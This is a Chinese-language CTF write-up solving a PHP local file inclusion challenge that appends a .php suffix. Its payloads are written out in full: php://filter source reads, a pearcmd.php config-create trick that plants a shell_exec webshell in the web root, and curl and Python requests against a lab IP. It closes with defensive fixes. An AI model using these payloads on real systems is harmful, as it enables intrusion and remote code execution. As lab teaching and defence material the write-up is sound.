# exam-web04 — LFI 本地文件包含 + .php 后缀追加

**题目**：访问 10004 端口
**环境**：Apache 2.4.54 + PHP 7.4.33，Debian
**外网**：183.129.189.62:21311

---

## 开局：先逛一圈

打开 `http://183.129.189.62:21311/`，一个"多语言帮助文档"页面。中间三个按钮："中文 / English / 日本語"。

点击"中文"，URL 变成 `?page=chinese`，下面的内容区切换成了中文帮助文档。

**看到 `?page=` 参数，我的第一反应就是 LFI——本地文件包含。** 这种通过参数动态加载页面内容的设计，十有八九后端是个 `include($_GET['page'])` 之类的写法。

---

## 侦察：确认 LFI 和后缀追加

先试个标准的路径遍历，看看能不能把 `/etc/passwd` 读出来：

```
?page=/etc/passwd
```

回车。页面没崩，但在内容区出现了两行 PHP Warning：

```
Warning: include(/etc/passwd.php): failed to open stream
Warning: include(): Failed opening '/etc/passwd.php'
```

两个关键信息暴露了：

1. **确实是 `include()`，LFI 确认。** 而且用的是 `include` 而非 `require`，失败也不中断页面渲染。
2. **自动追加了 `.php` 后缀！** 我传的是 `/etc/passwd`，它实际去找 `/etc/passwd.php`。

这说明后端的代码大概率是：
```php
$page = $_GET['page'];
include($page . '.php');
```

再试一个 `?page=/flag`：
```
Warning: include(/flag.php): failed to open stream
→ 根目录下有 /flag.php？不，是被加了后缀。那根目录的 /flag 存在吗？不确定。
```

---

## 挖源码：用 php://filter 看个究竟

想知道后端具体怎么写的，就得读到 `index.php` 的源码。LFI 场景下，`php://filter` 是读源码的神器——它把文件内容 base64 编码后输出，不会被 PHP 执行：

```
?page=php://filter/convert.base64-encode/resource=index
```

这个 payload 传进去后，后端会执行：
```php
include('php://filter/convert.base64-encode/resource=index.php');
```

返回的 HTML 内容区里多了一长串 base64 字符串。解码后：

```php
<?php
$page = $_GET['page'] ?? 'english';
$file = "{$page}.php";      // ← 就这一行，没有过滤
// ...
include($file);              // 第72行
?>
```

**干干净净，没有任何过滤。** `$page` 直接从 `$_GET` 拿来，拼个 `.php`，直接 `include`。防御水平为零。

---

## 思维卡壳：怎么绕过 .php 后缀？

现在问题来了：我要读 `/flag`，但它会被变成 `/flag.php`。而 `/flag.php` 大概率不存在。

我脑子里快速过了一遍常见的绕过手段：

| 手段 | 在这个环境可行吗？ |
|:--|:--|
| `%00` 截断 | ❌ PHP 5.3+ 已修复 |
| 超长路径截断 | ❌ PHP 7.4 没这 bug |
| `data://` 包装器 | ❌ `allow_url_include=0` 禁用了 |
| `php://input` + POST | ❌ 也会被加 .php → `php://input.php` |
| `/proc/self/environ` | ❌ 同样会被加 .php |

卡住了几分钟。`data://` 不能用、`php://input` 被污染、截断全部失效... 这意味着所有"无文件落地"的 RCE 方案都走不通。

**但我注意到一个东西没被禁：`php://filter` 可以正常工作。** 它只是用来编码/解码文件内容，不算远程包含，所以不受 `allow_url_include` 影响。

那有没有办法让 `php://filter` 帮我执行代码，而不是仅仅编码？

---

## 灵感：pearcmd.php！

突然想到，PHP 默认安装时会带 PEAR 包管理器，有一个 `pearcmd.php` 文件在 `/usr/local/lib/php/pearcmd.php`。

Docker 的 PHP 镜像默认 `register_argc_argv=On`，这意味着 `pearcmd.php` 可以从 URL query string 读取命令行参数。它有一个 `config-create` 命令，可以把配置写入任意文件——**包括写入 web 目录，而且是 `.php` 后缀的文件！**

思路通了：
1. 用 LFI include `pearcmd.php`，同时通过 query string 传参给 pear
2. 用 `config-create` 在 `/var/www/html/` 下创建一个 `.php` 文件
3. 这个文件中包含我们的 PHP 代码
4. 然后直接访问这个文件

---

## 执行：用 pearcmd 写 webshell（第一版，失败了）

构造 payload：

```
?page=/usr/local/lib/php/pearcmd
&+config-create
+/<?=system('cat /flag')?>
+/var/www/html/hzr.php
```

这里的关键语法：
- `page=/usr/local/lib/php/pearcmd` → 会被加上 .php 变成 `pearcmd.php`，正好是我们要的文件
- `&` 后面的 `+config-create` 是 pear 命令
- `+/<?=...?>` 是配置目录名（我希望这个字符串出现在配置文件中）
- `+/var/www/html/hzr.php` 是目标文件路径

提交后返回了一大堆 PEAR 配置输出，最后显示：
```
Successfully created default configuration file "/var/www/html/hzr.php"
```

成功了！文件被创建了。访问 `http://.../hzr.php`：

文件内容是 PEAR 序列化数据，但是... 关键的 PHP 标签部分变成了：
```
/%3C%3F=system(%27cat%20/flag%27);%3F%3E/pear/php
```

**坏了——`<?` 被 URL 编码成了 `%3C%3F`！** 这不是 PHP 能识别的标签，所以 include 的时候不会执行。

复盘：curl 在发送请求时把 `<?` 编码了。bin_dir 参数里存的是 URL 编码后的字符串，而不是原始的 PHP 短标签。

---

## 修正：让 pear 写入原始 PHP 标签

问题的根源是 URL 编码。我需要让 PHP 标签以原始形态传到服务器。

curl 用单引号括 URL 可以避免 shell 层面的转义，但 HTTP 协议本身对某些字符也需要编码。`<` 和 `>` 在 URL query string 中其实**不需要强制编码**——HTTP RFC 没有要求。

试了一下，curl 用单引号 + 不手动编码 `<?=`，确实成功把原始标签传过去了。但有一个新问题：标签中的 `'`（单引号）和 `/`（路径分隔）会影响 pear 的解析——`/` 被当作 pear 参数的分隔符。

换一个思路：用 `chr()` 动态构造字符串，避免在 URL 中出现需要编码的字符。

```
<?=readfile(chr(47).chr(102).chr(108).chr(97).chr(103))?>
```

`chr(47)` = `/`，`chr(102)` = `f`... 拼起来就是 `/flag`。整个 payload 不包含任何需要编码的字符。

```
?page=/usr/local/lib/php/pearcmd&+config-create+/<?=readfile(chr(47).chr(102).chr(108).chr(97).chr(103))?>+/var/www/html/hzr4.php
```

这次启动 curl，特意用单引号避免 shell 干扰：

```bash
curl 'http://183.129.189.62:21311/?page=/usr/local/lib/php/pearcmd&+config-create+/<?=readfile(chr(47).chr(102).chr(108).chr(97).chr(103))?>+/var/www/html/hzr4.php'
```

这次写入的文件中，配置项显示了原始的 `<?=readfile(...)?>` 标签，没有被 URL 编码！

访问 `hzr4.php`：

```
#PEAR_Config 0.9
a:12:{s:7:"php_dir";s:67:"/
Warning: readfile(/flag): failed to open stream: No such file or directory...
```

**PHP 被执行了！** 但是 `/flag` 不存在。

---

## 换目标：flag 不在这

和上一题不同，这题的 Docker 容器里没有 `/flag` 文件。得搜索一下 flag 在哪。

回退一步，写一个更通用的 webshell。这次用 Python 发请求，因为 curl 遇到 `$` 和 `[` 之类的字符会出问题：

```python
import urllib.request

# 写入通用webshell
url = 'http://183.129.189.62:21311/?page=/usr/local/lib/php/pearcmd&+config-create+/<?=shell_exec($_GET[c])?>+/var/www/html/hzr7.php'
urllib.request.urlopen(url)
```

然后：

```bash
# 搜索 flag 文件
curl "http://183.129.189.62:21311/hzr7.php?c=find%20/%20-name%20flag*"
# → /var/www/html/flag.php

# 读取 flag
curl "http://183.129.189.62:21311/hzr7.php?c=cat%20/var/www/html/flag.php"
# → <?php $flag = "flag{d2009805cc4cd44851e0e5678b4753ad}"; ?>
```

---

## 复盘：其实有更简单的方法

拿到 flag 后我再回头看——`flag.php` 就在 `/var/www/html/flag.php`。

而 LFI 恰好会自动追加 `.php` 后缀！

也就是说，**其实一步就够了**：

```
?page=php://filter/convert.base64-encode/resource=/var/www/html/flag
```

后端会执行：
```php
include('php://filter/convert.base64-encode/resource=/var/www/html/flag.php');
```

返回 base64 编码的 flag.php 源码，解码就能看到 flag。

我绕了一大圈用 pearcmd 写 webshell 再去搜，纯属"杀鸡用牛刀"。不过 pearcmd 这条路虽然迂回，但在 flag 文件不以 `.php` 结尾的场景下就是唯一解了。

---

## 回顾：解题脑内流程

```
打开页面 → 看到 ?page= 参数 → "这大概率是 LFI"
  → 试 /etc/passwd → Warning 暴露 include() + 追加 .php
    → php://filter 读源码 → 确认无过滤
      → 想绕过 .php → data:// 被禁、截断都不行
        → 想起 pearcmd.php → "试试 config-create 写文件"
          → 第一次写入发现 PHP 标签被 URL 编码了 → "得用 chr() 绕过"
            → 第二次成功写入且 PHP 执行 → "但 /flag 不存在？"
              → 写通用 webshell → find 搜索 → /var/www/html/flag.php
                → 回头发现其实一步 php://filter 就能搞定 ← 最优解
```

---

## 这道题教会我的

1. **读到源码比什么都重要。** 用 `php://filter` 读 `index.php` 后，整个攻击面就清晰了。
2. **.php 后缀追加不等于安全。** 只要 flag 文件恰好以 .php 结尾（很多 CTF 题都这么设计），php://filter 一步到位。
3. **pearcmd 是 PHP LFI 场景下的万能钥匙。** 只要 `register_argc_argv=On`（Docker 默认），就能在 web 目录写文件。尤其当 flag 文件不匹配后缀规则时需要它。
4. **URL 编码是 Web 攻击中常见的"隐藏杀手"。** 同一个 payload，用 curl 单引号和用浏览器直接访问，传输到服务器的内容可能不一样。这次就栽在 `%3C%3F` 上。
5. **先想简单方案，再搞复杂的。** 我应该先搜一下 flag 在哪，再决定用什么方法。而不是默认先搞 webshell。

---

## 防御视角

如果我是这个站点的开发：

1. **白名单限制 page 参数**：
   ```php
   $allowed = ['chinese', 'english', 'japanese'];
   if (!in_array($_GET['page'], $allowed)) die('Invalid page');
   ```

2. **关掉错误回显**：`display_errors = Off`，生产环境绝对不该暴露 Warning。

3. **删掉 pearcmd.php**：生产环境不需要 PEAR 包管理器，直接 `rm /usr/local/lib/php/pearcmd.php`。

4. **`open_basedir` 限制**：把 PHP 能访问的目录限制在 `/var/www/html` 内。

5. **禁用危险函数**：
   ```ini
   disable_functions = system,exec,shell_exec,passthru,popen,proc_open
   ```
